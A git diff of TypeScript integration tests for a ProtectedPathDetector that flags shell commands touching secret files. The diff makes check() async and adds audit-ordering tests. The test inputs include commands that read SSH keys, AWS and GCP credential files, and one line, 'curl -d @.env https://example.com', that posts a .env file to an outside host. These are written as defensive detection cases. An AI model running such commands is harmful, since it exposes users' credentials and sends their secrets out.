@@ -75,82 +75,84 @@ describe("Integration Tests (T015)", () => {
   // -------------------------------------------------------------------------
 
   describe("Protected path detection [FR-028-007]", () => {
-    it("cat .env triggers warning", () => {
+    it("cat .env triggers warning", async () => {
       const detector = new ProtectedPathDetector();
       const warnings: string[] = [];
       detector.onWarning(m => warnings.push(m.matchedPath));
 
-      const matches = detector.check("cat .env");
+      const matches = await detector.check("cat .env");
       expect(matches.length).toBeGreaterThan(0);
       expect(matches[0].matchedPath).toBe(".env");
       expect(warnings).toContain(".env");
     });
 
-    it("cat .env.local triggers warning", () => {
+    it("cat .env.local triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("cat .env.local");
+      const matches = await detector.check("cat .env.local");
       expect(matches.length).toBeGreaterThan(0);
     });
 
-    it("Windows .env path triggers warning", () => {
+    it("Windows .env path triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("type C:\\repo\\.env");
+      const matches = await detector.check("type C:\\repo\\.env");
       expect(matches.length).toBeGreaterThan(0);
       expect(matches[0].matchedPath).toBe("C:\\repo\\.env");
     });
 
-    it("cat README.md does NOT trigger warning", () => {
+    it("cat README.md does NOT trigger warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("cat README.md");
+      const matches = await detector.check("cat README.md");
       expect(matches.length).toBe(0);
     });
 
-    it("SSH key access triggers warning", () => {
+    it("SSH key access triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("cat ~/.ssh/id_rsa");
+      const matches = await detector.check("cat ~/.ssh/id_rsa");
       expect(matches.length).toBeGreaterThan(0);
       expect(matches[0].matchedPath).toBe("~/.ssh/id_rsa");
     });
 
-    it("AWS credentials access triggers warning", () => {
+    it("AWS credentials access triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("cat ~/.aws/credentials");
+      const matches = await detector.check("cat ~/.aws/credentials");
       expect(matches.length).toBeGreaterThan(0);
     });
 
-    it("Windows AWS credentials path triggers warning", () => {
+    it("Windows AWS credentials path triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("Get-Content C:\\Users\\alice\\.aws\\credentials");
+      const matches = await detector.check("Get-Content C:\\Users\\alice\\.aws\\credentials");
       expect(matches.length).toBeGreaterThan(0);
     });
 
-    it("GCP ADC access triggers warning", () => {
+    it("GCP ADC access triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("cat ~/.config/gcloud/application_default_credentials.json");
+      const matches = await detector.check(
+        "cat ~/.config/gcloud/application_default_credentials.json"
+      );
       expect(matches.length).toBeGreaterThan(0);
     });
 
-    it("vim on credentials.json triggers warning", () => {
+    it("vim on credentials.json triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("vim credentials.json");
+      const matches = await detector.check("vim credentials.json");
       expect(matches.length).toBeGreaterThan(0);
     });
 
-    it("cp of .env file triggers warning", () => {
+    it("cp of .env file triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("cp .env .env.backup");
+      const matches = await detector.check("cp .env .env.backup");
       expect(matches.length).toBeGreaterThan(0);
     });
 
-    it("curl -d @.env triggers warning", () => {
+    it("curl -d @.env triggers warning", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("curl -d @.env https://example.com");
+      const matches = await detector.check("curl -d @.env https://example.com");
       expect(matches.length).toBeGreaterThan(0);
     });
 
-    it("command with multiple protected file args detects all paths", () => {
+    it("command with multiple protected file args detects all paths", async () => {
       const detector = new ProtectedPathDetector();
-      const matches = detector.check("cat .env ~/.aws/credentials");
+      const matches = await detector.check("cat .env ~/.aws/credentials");
       // Both paths should be detected
       expect(matches.length).toBeGreaterThanOrEqual(2);
     });
@@ -158,19 +160,49 @@ describe("Integration Tests (T015)", () => {
     it("emits bus event on protected path access", async () => {
       const bus = new InMemoryLocalBus();
       const detector = new ProtectedPathDetector({ bus });
-      detector.check("cat .env", {
+      await detector.check("cat .env", {
         terminalId: "term-1",
         correlationId: "corr-1",
       });
-
-      // Give microtask queue a chance to process
-      await new Promise(r => setTimeout(r, 0));
 
       const events = bus.getEvents();
       const pathEvent = events.find(e => e.topic === "secrets.protected_path.accessed");
       expect(pathEvent).toBeDefined();
       expect(pathEvent?.payload?.matchedPath).toBe(".env");
       expect(pathEvent?.payload?.terminalId).toBe("term-1");
+    });
+
+    it("owns access audit before returning matches or warnings", async () => {
+      const bus = new InMemoryLocalBus();
+      let releasePublish: (() => void) | undefined;
+      bus.publish = () =>
+        new Promise<void>(resolve => {
+          releasePublish = resolve;
+        });
+      const detector = new ProtectedPathDetector({ bus });
+      const warnings: string[] = [];
+      detector.onWarning(match => warnings.push(match.matchedPath));
+
+      const operation = detector.check("cat .env");
+      const warningsBeforeAudit = [...warnings];
+      releasePublish?.();
+
+      expect(operation).toBeInstanceOf(Promise);
+      expect(warningsBeforeAudit).toEqual([]);
+      const matches = await operation;
+      expect(matches.length).toBeGreaterThan(0);
+      expect(warnings).toContain(".env");
+    });
+
+    it("does not emit warnings when access audit publication fails", async () => {
+      const bus = new InMemoryLocalBus();
+      bus.publish = () => Promise.reject(new Error("audit unavailable"));
+      const detector = new ProtectedPathDetector({ bus });
+      const warnings: string[] = [];
+      detector.onWarning(match => warnings.push(match.matchedPath));
+
+      await expect(detector.check("cat .env")).rejects.toThrow("audit unavailable");
+      expect(warnings).toEqual([]);
     });
   });
 
@@ -180,7 +212,7 @@ describe("Integration Tests (T015)", () => {
       const pattern = await config.addPattern("*.pem", "PEM certificate files");
       const detector = new ProtectedPathDetector({ config });
 
-      const matches = detector.check("cat server.pem");
+      const matches = await detector.check("cat server.pem");
       expect(matches.length).toBeGreaterThan(0);
       expect(matches[0].patternId).toBe(pattern.id);
     });
@@ -190,7 +222,7 @@ describe("Integration Tests (T015)", () => {
       await config.disablePattern("dotenv");
       const detector = new ProtectedPathDetector({ config });
 
-      const matches = detector.check("cat .env");
+      const matches = await detector.check("cat .env");
       expect(matches.length).toBe(0);
     });
 
@@ -238,32 +270,32 @@ describe("Integration Tests (T015)", () => {
       const detector = new ProtectedPathDetector({ bus });
 
       const operation = detector.acknowledge("dotenv", ".env", "corr-owned-ack");
-      const matchesBeforeAudit = detector.check("cat .env");
+      const matchesBeforeAudit = await detector.check("cat .env");
       releasePublish?.();
 
       expect(operation).toBeInstanceOf(Promise);
       expect(matchesBeforeAudit.length).toBeGreaterThan(0);
       await operation;
-      expect(detector.check("cat .env")).toEqual([]);
+      expect(await detector.check("cat .env")).toEqual([]);
     });
 
     it("acknowledgment prevents re-trigger within debounce window", async () => {
       const detector = new ProtectedPathDetector();
-      const matches1 = detector.check("cat .env");
+      const matches1 = await detector.check("cat .env");
       expect(matches1.length).toBeGreaterThan(0);
 
       // Acknowledge
       await detector.acknowledge(matches1[0].patternId, ".env", "corr-1");
 
       // Second check should be debounced
-      const matches2 = detector.check("cat .env");
+      const matches2 = await detector.check("cat .env");
       expect(matches2.length).toBe(0);
     });
 
     it("acknowledgment emits audit event", async () => {
       const bus = new InMemoryLocalBus();
       const detector = new ProtectedPathDetector({ bus });
-      detector.check("cat .env");
+      await detector.check("cat .env");
       await detector.acknowledge("dotenv", ".env", "corr-ack");
 
       const events = bus.getEvents();
@@ -285,7 +317,7 @@ describe("Integration Tests (T015)", () => {
       await expect(detector.acknowledge("dotenv", ".env", "corr-failed-ack")).rejects.toThrow(
         "audit unavailable"
       );
-      expect(detector.check("cat .env").length).toBeGreaterThan(0);
+      expect((await detector.check("cat .env")).length).toBeGreaterThan(0);
     });
   });
 
@@ -609,7 +641,7 @@ describe("Integration Tests (T015)", () => {
       const wrappedBus = sink.wrapBus(bus);
 
       const detector = new ProtectedPathDetector({ bus: wrappedBus });
-      detector.check("cat .env", {
+      await detector.check("cat .env", {
         terminalId: "term-1",
         correlationId: "corr-path",
       });
@@ -630,7 +662,7 @@ describe("Integration Tests (T015)", () => {
 
       const detector = new ProtectedPathDetector({ bus: wrappedBus });
       // Command that includes an AWS key inline (should be stripped in redactedCommand)
-      detector.check("cat .env AKIAIOSFODNN7EXAMPLE", {
+      await detector.check("cat .env AKIAIOSFODNN7EXAMPLE", {
         terminalId: "term-1",
         correlationId: "corr-sensitive",
       });
